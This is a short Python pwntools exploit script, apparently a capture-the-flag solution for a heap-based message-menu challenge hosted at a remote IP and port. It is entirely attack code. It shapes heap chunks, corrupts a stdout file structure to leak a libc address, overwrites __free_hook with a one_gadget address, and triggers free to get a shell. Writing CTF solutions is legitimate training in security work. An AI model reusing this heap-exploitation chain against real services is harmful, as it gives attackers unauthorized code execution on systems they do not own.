from pwn import*
def add(size,content):
	p.sendlineafter('choice:','1')
	p.sendlineafter('How long is this message?',str(size))
	if size >0x400:
		return 0
	p.sendafter('What is the content of the message?',content)
def free(idx):
	p.sendlineafter('choice:','2')
	p.sendlineafter('deleted?',str(idx))
def edit(idx,content):
	p.sendlineafter('choice:','3')
	p.sendlineafter('modified?',str(idx))
	p.sendafter('message?',content)
p = remote('121.36.209.145',9997)
#p = process('./main')
#context.log_level = 'debug'
libc = ELF('libc-2.23.so',checksec=False)
og = [0x45216,0x4526A,0xF02A4,0xF1147]
add(0x18,'FMYY')
add(0x18,'FMYY')
add(0x68,'FMYY')
free(0)
free(1)
add(0x500,'FMYY')
edit(0,p64(0)+p64(0x21)+'\x80')
add(0x18,p64(0x602088))
edit(2,p64(0xF0)+p64(0)*6+p64(0x602080))
edit(0,p64(0xFBAD1800)+p64(0)*3+'\x88')
p.recvline()
libc_base=u64(p.recv(6).ljust(8,'\x00'))-libc.sym['_IO_2_1_stdin_']
libc.address = libc_base
edit(1,p64(libc.sym['__free_hook']))
edit(2,p64(libc_base+og[1]))
free(0)
p.interactive()


